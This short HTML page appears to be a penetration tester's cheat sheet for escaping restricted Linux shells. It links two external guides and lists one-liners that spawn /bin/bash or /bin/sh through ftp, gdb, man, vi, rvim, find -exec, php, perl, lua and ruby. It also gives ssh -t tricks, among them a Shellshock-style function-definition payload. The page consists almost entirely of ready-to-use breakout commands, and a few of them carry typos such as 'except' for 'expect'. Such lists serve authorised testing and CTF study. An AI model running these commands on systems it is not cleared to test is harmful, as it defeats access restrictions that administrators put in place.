<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Escape Shell</title>
</head><body><b>Guides:</b><ul><li>https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</li>
<li>https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/</li>
</ul>
<br/>
<b>Reminder:</b><br/>
-<b>Check what are the blacklist/whitelist character </b><br/>
-echo $PATH &nbsp;-&gt; <b>try to change it</b><br/>
-echo $SHELL -&gt; <b>try to change to /bin/sh</b><br/>
-<b>Test basic commands</b>, like ls,pwd,cd,env,set,export,vi,cp,mv<br/>
<br/>
<br/>
<br/>
-If / is allowed you can run /bin/bash, copy /bin/bash to your home folder<br/>
-ftp -&gt; !/bin/bash<br/>
-gdb -&gt; !/bin/bash<br/>
-man -&gt; !/bin/bash<br/>
-vi -&gt; !/bin/bash<br/>
-rvim -&gt; :python import os; os.system("/bin/bash")<br/>
-find -&gt; find / -name test -exec /bin/bash \;<br/>
-except -&gt; except spawn sh then sh<br/>
-php -&gt; php -a then exec("sh -i");<br/>
-perl -&gt; perl -e 'exec "/bin/sh";'<br/>
-lua -&gt; os.execute('bin/sh')<br/>
-ruby -&gt; exec " /bin/sh"<br/>
<br/>
1)From ssh &gt; ssh username@IP -t "/bin/sh" or "/bin/bash"<br/>
2)From ssh2 &gt; ssh username@IP -t "bash --noprofile"<br/>
3)From ssh3 &gt; ssh username@IP -t "() { :; }; /bin/bash" <br/>
</body></html>